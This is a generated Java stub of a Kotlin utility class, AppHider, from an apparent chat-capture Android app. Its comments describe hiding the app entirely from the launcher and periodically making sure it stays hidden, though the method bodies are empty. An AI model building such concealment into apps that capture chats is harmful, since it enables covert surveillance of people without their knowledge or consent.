package com.chats.capture.utils;

/**
 * Utility to completely hide the app from launcher and ensure it stays hidden
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000&\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0000\b\u00c6\u0002\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002J\u000e\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\bJ\u000e\u0010\t\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\bJ\u000e\u0010\n\u001a\u00020\u000b2\u0006\u0010\u0007\u001a\u00020\bR\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\f"}, d2 = {"Lcom/chats/capture/utils/AppHider;", "", "()V", "LAUNCHER_ACTIVITY_CLASS", "", "ensureHidden", "", "context", "Landroid/content/Context;", "hide", "isHidden", "", "app_debug"})
public final class AppHider {
    @org.jetbrains.annotations.NotNull()
    private static final java.lang.String LAUNCHER_ACTIVITY_CLASS = "com.chats.capture.ui.SettingsLauncherActivity";
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.utils.AppHider INSTANCE = null;
    
    private AppHider() {
        super();
    }
    
    /**
     * Hide app from launcher completely
     */
    public final void hide(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
    }
    
    /**
     * Check if app is hidden from launcher
     */
    public final boolean isHidden(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
        return false;
    }
    
    /**
     * Ensure app stays hidden (call this periodically)
     */
    public final void ensureHidden(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
    }
}